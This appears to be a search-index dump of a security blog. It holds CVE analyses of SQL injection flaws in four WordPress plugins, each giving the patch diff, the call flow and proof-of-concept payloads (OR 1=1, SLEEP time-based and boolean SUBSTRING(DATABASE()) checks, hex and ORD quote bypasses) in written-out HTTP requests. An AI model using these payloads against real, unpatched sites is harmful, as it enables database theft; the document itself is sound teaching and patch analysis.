{$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders)\", $keys ); $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026 OFFSET (safe with prepare) $final_query = $wpdb-\u003eprepare( \"SELECT user_id FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\", array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Patch Diff ","date":"2025-09-25","objectID":"/2025-09-25-cve-2025-58604/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"How It Works The vulnerability resides in the function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) inside the Import class. To trace its usage, search for the keyword get_wp_users_by_learndash_with_limit_offset in the plugin directory. Search Import The function is called inside: retrieve_contacts_associated_with_learndash() perform_learndash_user_import() These functions belong to the ContactImportAction class in /app/API/Actions/Admin/Contact/ContactImportAction.php. Next, searching for retrieve_contacts_associated_with_learndash reveals it is used inside another method: Search 1 This function is invoked by map_contacts_with_learndash() in the ContactImportController class located in /app/API/Controllers/Admin/Contact/ContactImportController.php. Further tracing map_contacts_with_learndash shows it is registered as a REST API callback: Search 2 class ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u003enamespace, // mrm/v1 $this-\u003erest_base . '/learndash/map', // contacts/import/learndash/map/ array( array( 'methods' =\u003e WP_REST_Server::CREATABLE, // POST 'callback' =\u003e array( $this-\u003econtroller, 'map_contacts_with_learndash' ), 'permission_callback' =\u003e PermissionManager::current_user_can('mint_manage_contacts'), // Admin 'args' =\u003e array( 'selectedCourses' =\u003e array( 'description' =\u003e __( 'The selected courses from which to import contacts.', 'mrm' ), 'required' =\u003e true, 'type' =\u003e 'array', 'sanitize_callback' =\u003e 'rest_sanitize_array', ) ), // array + required ), ) ); // other logic } // other logic } Call flow: A POST request is made to /wp-json/mrm/v1/contacts/import/learndash/map with the required parameter selectedCourses. The callback map_contacts_with_learndash(WP_REST_Request $request) receives the request. The $request object is converted to an array $params. The callback then calls retrieve_contacts_associated_with_learndash($params). That function finally calls get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) where: $courses = $params['selectedCourses'] $keys is an array built from all value fields in $courses, concatenated like course_{COURSE_ID}_access_from. Before being inserted into the SQL query, the $keys array is merged into a string using implode(). The query is executed and returns a JSON response with formatted_users and total_users. ","date":"2025-09-25","objectID":"/2025-09-25-cve-2025-58604/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Exploit After analyzing the code, it‚Äôs clear that the selectedCourses parameter undergoes several transformations before being injected into the vulnerable SQL query ‚Äî but the attacker still controls the value key. POST request using BurpSuite: A single key can be used to easily control the final SQL query. Get all user info The resulting query looks like this: SELECT user_id FROM wp_usermeta WHERE meta_key IN ('course_abc') OR 1=1 -- _access_from') GROUP BY user_id LIMIT 5 OFFSET 0 ') escapes the IN clause 1=1 is always true ‚Üí returns all user IDs from wp_usermeta The rest of the function retrieves metadata for all returned users: $formatted_users = array_map( function ($user) { $user-\u003eusermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u003eID) ); return $user; }, $contacts ); ","date":"2025-09-25","objectID":"/2025-09-25-cve-2025-58604/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-58604 vulnerability in the WordPress Mail Mint plugin (prior to version 1.18.6) originates from not using $wpdb-\u003eprepare() when executing SQL queries. Instead, user input was directly concatenated into the SQL statement ‚Äî leading to a classic SQL Injection vulnerability. The patch now uses $wpdb-\u003eprepare() to safely construct SQL queries and mitigate this issue. Key takeaways: Always use $wpdb-\u003eprepare() when interacting with the WordPress database to prevent SQL Injection. Regularly update your plugins and perform security reviews to avoid exploitation. ","date":"2025-09-25","objectID":"/2025-09-25-cve-2025-58604/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Mail Mint Plugin \u003c= 1.18.5 is Vulnerable to SQL Injection ","date":"2025-09-25","objectID":"/2025-09-25-cve-2025-58604/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Easy Quotes Plugin.","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":" A vulnerability exists in the Easy Quotes WordPress plugin prior to version 1.2.3. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration. CVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Easy Quotes Plugin: v1.2.2 (vulnerable) and v1.2.3 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Analysis The application injects user-supplied data directly into an SQL query without appropriate protections, which leads to SQL Injection. ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file includes/quotes-data.php: private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } The patch uses $wpdb-\u003eprepare() instead of concatenating user-supplied data directly into the query: private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; $sql = $wpdb-\u003eprepare( \"SELECT * FROM %i WHERE `family` = %s\", $tablename, $family ); return $wpdb-\u003eget_row($sql); } Patch diff Many other functions were patched the same way, such as get_font_variant($family_id, $variant_id), get_font_variants($family), and get_fonts($category = -1). Although get_fonts_categories() was also updated, it does not accept user input and is thus not relevant to the SQLi issue: public static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-categories'; $sql = $wpdb-\u003eprepare( \"SELECT `category_id`, `category` FROM %i\", $tablename ); return $wpdb-\u003eget_results($sql); } ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"How it works We exploit the SQL Injection in the function get_family_data($family), and other functions are vulnerable in a similar manner. get_family_data() is a private function in the Quotes_Data class (the example below shows context): class Quotes_Data { function __construct() { add_filter('posts_where', array($this, 'posts_where'), 10, 2); } // other functions public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } } get_family_data() is called by get_family() and get_font_variants(); to find where these are used, search for get_family or get_font_variants. Search function The get_font_variants() function is invoked by rest_route_callback_font_variants() in the Quotes_Rest_Route class: class Quotes_Rest_Route { function __construct() { add_action('rest_api_init', array($this, 'rest_api_init')); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ 'method' =\u003e WP_REST_Server::READABLE, 'callback' =\u003e [$this, 'rest_route_callback_quote'], 'permission_callback' =\u003e '__return_true' ]; register_rest_route('layart/v1', '/quote', $args); // other logic $args['callback'] = [$this, 'rest_route_callback_font_variants']; register_rest_route('layart/v1', '/font-variants', $args); } // other functions function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u003eget_param('family'); $family = isset($family) ? $family : \"Shadows Into Light\"; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } The constructor of Quotes_Rest_Route uses add_action('rest_api_init', ...) to register endpoints with WordPress‚Äôs REST API system. The callback rest_route_callback_font_variants corresponds to the endpoint /wp-json/layart/v1/font-variants?family=family_name. If the family parameter is not provided, it defaults to Shadows Into Light. ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Detecting SQLi We use a Boolean-based SQL Injection technique to test whether the family parameter is injectable. True request (example): When the injected condition evaluates to true, the query returns normally: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto' AND '1'='1'; False request (example): When the injected condition is false, no results are returned: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto' AND '1'='2'; ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Get First Letter of Database Name A prerequisite to dumping data is being able to extract a single character of the database name; once you can obtain one character, you can typically extract the rest. In my test environment the database name is wordpress, so the first character is w. First letter A payload checking SUBSTRING(DATABASE(),1,1)='w' returns data normally, confirming the first letter is w: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto' AND SUBSTRING(DATABASE(),1,1)='w'; ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Conclusion The vulnerability CVE-2025-26943 in the WordPress Easy Quotes plugin (versions prior to 1.2.3) is caused by concatenating user-supplied input directly into SQL queries instead of using prepared statements ($wpdb-\u003eprepare), which results in SQL Injection. The official patch replaces string concatenation with $wpdb-\u003eprepare, ensuring user input is safely handled. Key takeaways: Always use $wpdb-\u003eprepare() when interacting with the database in WordPress to prevent SQL Injection. Regularly update plugins and perform security checks to avoid becoming an attack target. ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"References SQL Injection cheat sheet - PortSwigger WordPress Easy Quotes Plugin \u003c= 1.2.2 is vulnerable to SQL Injection ","date":"2025-09-23","objectID":"/2025-09-23-cve-2025-26943/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Taskbuilder Plugin.","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":" The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information. CVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability. ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare differences between the vulnerable version and the patched version. The clear difference is in the file includes/admin/projects/get_users.php. In version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = $proj_id\" ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = '$proj_id'\" ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection. Patch diff ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"How It Works File Architecture: General structure of the current file: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row(\"SELECT * FROM {$wpdb-\u003eprefix}wppm_project WHERE id = $proj_id\"); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ 'body' =\u003e $body, 'footer' =\u003e $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it‚Äôs called from another feature. To find where it‚Äôs used, search for get_users.php in the plugin directory. Search get users üëâ It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook. WPPM_Admin constructor: final class WPPM_Admin { public function __construct() { // other actions add_action( 'wp_ajax_wppm_get_users', array($this,'wppm_get_users')); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook. wp_ajax_wppm_get_users is an Ajax hook name: wp_ajax_{action} ‚Üí handles Ajax for logged-in users. wp_ajax_nopriv_{action} ‚Üí handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users(). üëâ Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin. Ajax search The wppm_get_users action is the data part in the POST request handled by wppm_get_users(). The function is referenced in HTML attributes of the project feature: Create a new project Access that project Inspect code to locate wppm_get_users and see which actions call it Ajax inspect üëâ Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML. Model display ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+SLEEP(1)) Sqli success Response delay indicates a successful SQL Injection. ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Get First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped. Send a boolean-based SQLi payload with the correct proj_id: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77). SUBSTRING(STRING,1,1) retrieves the first character. Here, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users. Res 1 Using HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used. Send a boolean-based SQLi payload with a wrong proj_id: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None. Res 2 üëâ We successfully retrieved the first character of the database name using boolean-based SQLi: Correct proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow. ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax. The patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL. Key Takeaways: Prefer prepared statements ($wpdb-\u003eprepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Taskbuilder \u003c= 4.0.1 Vulnerable to SQL Injection ","date":"2025-09-22","objectID":"/2025-09-22-cve-2025-39569/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":" A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration. CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient. ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php Vulnerable version: if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } Patched version: if(!empty($_GET['ob'])) { $ob = sanitize_text_field($_GET['ob']); if(!in_array($ob, ['tB.id', 'tB.contact_name', 'tB.contact_email', 'tB.from_date', 'tB.amount_paid', 'tB.status'])) { $ob = 'tB.id'; } $orderby = \"ORDER BY $ob $dir\"; } üëâ The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'. Analysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context. ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"How it works To inject, we need to identify the complete query used here: $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); The query resides in the default branch of the switch structure. All this logic belongs to the static manage() method of the WPHostelBookings class. class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { case 'add': // add handle break; case 'edit': // edit handle break; // view/print booking details. Will allow also to confirm/cancel case 'view': // view handle break; // list bookings default: // another logic if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \"manage\" in the plugin folder. Search In the file models/hostel.php we have: class class WPHostel { // another logic static function menu() { // we use 'hostelpro_manage' for consistency with the pro version $wphostel_caps = current_user_can('manage_options') ? 'manage_options' : 'hostelpro_manage'; add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __('Settings', 'wphostel'), __('Settings', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __(\"Manage Rooms\", 'wphostel'), __(\"Manage Rooms\", 'wphostel'), $wphostel_caps, 'wphostel_rooms', array('WPHostelRooms', \"manage\")); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); add_submenu_page('wphostel_options', __(\"Unavailable Dates\", 'wphostel'), __(\"Unavailable Dates\", 'wphostel'), $wphostel_caps, 'wphostel_unavailable', array('WPHostelBookings', \"unavailable\")); add_submenu_page('wphostel_options', __(\"Email Log\", 'wphostel'), __(\"Email Log\", 'wphostel'), $wphostel_caps, 'wphostel_emaillog', array('WPHostelHelp', \"email_log\")); add_submenu_page('wphostel_options', __(\"Help\", 'wphostel'), __(\"Help\", 'wphostel'), $wphostel_caps, 'wphostel_help', array('WPHostelHelp', \"index\")); } // another logic } Here: add_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example: // add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = '', $icon_url = '', $position = null); add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = ''); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); // array('WPHostelBookings', \"manage\")); =\u003e WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory. Search menu In the plugin root file hostel.php we have: add_action('admin_menu', array(\"WPHostel\", \"menu\")); // =\u003e callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"Detecting SQLi Request with BurpSuite: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=upcoming\u0026ob=tB.status,(SELECT+SLEEP(10))\u0026dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values. Detecting SQLi Result: the response time is delayed ‚Üí SQL Injection succeeded. ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"Dumping Data from the Database Bypass ' using ORD(): To dump database data we need to extract characters such as the first character of the database name. Because sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Bypass succeeds ‚Üí we can extract the database name. Dumping Data from the Database Bypass ' using Hex encoding (alternative) Besides ORD() we can use Hex encoding to bypass: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Bypass succeeds ‚Üí database name can be extracted. Bypass succeeds ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"Conclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection. Key takeaways: sanitize_text_field() ‚â† protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"References SQL Injection Cheat Sheet ‚Äì PortSwigger WordPress Hostel Plugin \u003c= 1.1.5.6 is vulnerable to SQL Injection - patchstack ","date":"2025-09-21","objectID":"/2025-09-21-cve-2025-39566/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/2025-09-21-cve-2025-39566/"},{"categories":["Technology","Web"],"content":"A powerful and the most popular content management system (CMS).","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":" WordPress is a powerful and the most popular content management system (CMS) that allows you to easily create, manage, and customize websites and blogs. It is an open-source CMS, built on PHP and using either MySQL or MariaDB. Released in 2003, initially just for 